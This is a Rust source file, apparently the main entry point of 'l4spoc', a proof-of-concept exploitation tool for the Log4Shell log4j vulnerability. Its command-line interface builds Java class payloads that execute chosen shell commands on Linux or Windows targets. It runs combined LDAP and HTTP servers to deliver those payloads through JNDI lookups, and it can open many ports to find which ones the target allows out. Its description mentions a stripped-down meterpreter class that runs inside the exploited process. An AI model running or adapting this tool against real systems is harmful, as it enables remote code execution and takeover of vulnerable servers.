#![feature(ip)]

mod web_server;
mod ldap_server;
mod build_java;
mod common;
mod multiplexed;

use common::{RunServerCfg, BuildCmdCfg};
use std::fs;
use get_if_addrs::{IfAddr, get_if_addrs};
use clap::{Arg, App, ArgMatches};

#[tokio::main]
async fn main() -> () {
    let matches = App::new("l4spoc")
        .version("0.2.0")
        .author("Walter Szewelanczyk. <walterszewelanczyk@gmail.com>")
        .about("This is a Rust based POC to show the \"Log4Shell\" vulnerability in log4j.  This can create command based jars for exploiting and also has a stripped down meterpreter class that will run in a thread of the exploited process.  This hosts the ldap server and the http server from the same port.  You can run on multiple ports simultaneously to attempt to see what ports may be available for egress on the target machine.")
        .subcommand(App::new("build")
            .about("Build java class payload")
            .arg(Arg::new("class_name")
                .long("class_name")
                .short('c')
                .takes_value(true)
                .required(true)
                .help("The name of the Class to build.  It is what you would request via jndi.  for a Cmd1.class you would use Cmd1")) 
            .arg(Arg::new("linux_cmd")
                .long("linux")
                .short('l')
                .takes_value(true)
                .default_value("")
                .help("The command to execute on Linux Systems via /bin/sh -c \"the_command\"")
            ).arg(Arg::new("windows_cmd")
                .long("windows")
                .short('w')
                .takes_value(true)
                .default_value("")
                .help("The command to execute on Windows Systems via cmd -C \"the_command\"")
            ).arg(Arg::new("build_path")
                .long("build_path")
                .short('b')
                .default_value("wwwroot")
                .takes_value(true)
                .help("the dir to build the payloads.  Will create if it doesn't exist.  Should use same dir as www_root in run_servers.")
            ))
        .subcommand(App::new("run")
            .about("Run the ldap and http servers")
            .arg(Arg::new("addr")
                .long("addr")
                .short('a')
                .default_value("")
                .takes_value(true)
                .help("The http address to publish")
            ).arg(Arg::new("ports")
                .long("ports")
                .short('p')
                .default_value("")
                .takes_value(true)
                .help("The ports used to server the LDAP and HTTP requests from.")
            ).arg(Arg::new("Op")
                .long("Op")
                .takes_value(true)
                .help("The name of the file to write the opened ports to.")
            ).arg(Arg::new("Of")
                .long("Of")
                .takes_value(true)
                .help("The name of the file to write the failed ports to.")
            ).arg(Arg::new("pF")
                .long("pF")
                .takes_value(true)
                .help("Load ports from a file.  Expects one port per line, can comment out a line with a #.")
            ).arg(Arg::new("pALL")
                .long("pALL")
                .takes_value(false)
                .help("Use all available ports up to 49150.  Note : this will open thousands of ports and may hit open file limits.")
            ).arg(Arg::new("pC20")
                .long("pC20")
                .takes_value(false)
                .help("Use the 20 common ports.")
            ).arg(Arg::new("wwwroot")
                .long("wwwroot")
                .default_value("wwwroot")
                .takes_value(true)
                .help("The dir to serve the payloads from.  Will create if it doesn't exist.  Note this should be the same build_path you used for any build_cmd classes.  You can also put in any other classes into this dir.")
            ))
        .get_matches();

    if let Some(m) = matches.subcommand_matches("build"){
        let cfg : BuildCmdCfg = convert_args_for_build_cmd(m);
        build_java::is_javac_installed();
        fs::create_dir_all(&cfg.build_path)
            .expect(&format!("Unable to create {} dir", cfg.build_path));    

        build_java::build_exec_cmd_class(cfg).expect("faild to build cmd");
    } else if let Some(m) = matches.subcommand_matches("run"){
        let cfgs = convert_args_for_run_server_cfg(m);
        build_java::is_javac_installed();
        run_servers(cfgs).await;
    }
}

fn get_default_ip_addr_str() -> String{
    let addrs = match get_if_addrs() {
        Ok(a) => a,
        Err(_) => return "127.0.0.1".to_string()
    };

    for a in &addrs {
        let ip = a.ip();
        if ip.is_ipv4() &&  ip.is_global(){
            return ip.to_string() 
        }
    }
    
    for a in &addrs {
        match &a.addr {
            IfAddr::V4(av4) => {
                if av4.broadcast.is_some() {
                    return av4.ip.to_string();
                }
            },
            _ => continue,
        }
    }

    return "127.0.0.1".to_string();
}

fn get_ports_from_args(m : &ArgMatches) -> Vec<u16>{
    let ps : String = m.value_of_t_or_exit("ports");
    let mut ports : Vec<u16> = ps.split(",")
        .filter_map(|s| {
            let s = s.trim();
            if s.len() == 0 {return None};
            Some(s.parse().expect(&format!("Error parsing port {} from --ports (-p) arg", s)))
        })
        .collect();
    
    if m.occurrences_of("pALL") > 0 {
        (1..=49150).for_each(|p| ports.push(p));
    }

    if m.occurrences_of("pC20") > 0 {
        let cp20 : Vec<u16> = vec![80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111, 995, 993, 5900];
        cp20.into_iter().for_each(|p| ports.push(p));
    }

    match m.value_of("pF") {
        Some(file_name) => {
           let contents = fs::read_to_string(file_name).expect(&format!("Unable to read ports file : {}", file_name)); 
           let file_ports : Vec<u16> = contents.split("\n")
                .filter_map(|line| {
                    let s = line.trim();
                    if s.len() == 0 || s.starts_with("#") {return None};
                    Some(s.parse().expect(&format!("Error parsing port {} from file {}", s, file_name)))
                })
                .collect();
            file_ports.into_iter().for_each(|p| ports.push(p));
        },
        None => {},
    }

    ports.sort();
    ports.dedup();

    ports
}

fn convert_option(o : Option<&str>) -> Option<String>{
    match o {
        Some(s) => Some(s.to_string()),
        None => None,
    }
}

fn convert_args_for_run_server_cfg(m : &ArgMatches) -> RunServerCfg{
    let mut addr = m.value_of_t_or_exit("addr");
    if addr == "" { addr = get_default_ip_addr_str(); }
    RunServerCfg{
        web_root  : m.value_of_t_or_exit("wwwroot"),
        addr, 
        ports : get_ports_from_args(m),
        ports_file_name : convert_option(m.value_of("Op")),
        failed_file_name : convert_option(m.value_of("Of")),
    }
}

async fn run_servers(rsc: RunServerCfg) -> () {
    fs::create_dir_all(&rsc.web_root)
        .expect(&format!("Unable to create {} dir", rsc.web_root));    
    println!("We will send the JNDI requests the base address of http://{}", &rsc.addr);
    multiplexed::run_multiplexed_servers(rsc).await;
}

fn convert_args_for_build_cmd(m : &ArgMatches) -> BuildCmdCfg {
    return BuildCmdCfg{
        build_path : m.value_of_t_or_exit("build_path"),
        class_name : m.value_of_t_or_exit("class_name"),
        l_cmd : m.value_of_t_or_exit("linux_cmd"),
        w_cmd : m.value_of_t_or_exit("windows_cmd")
    }
}
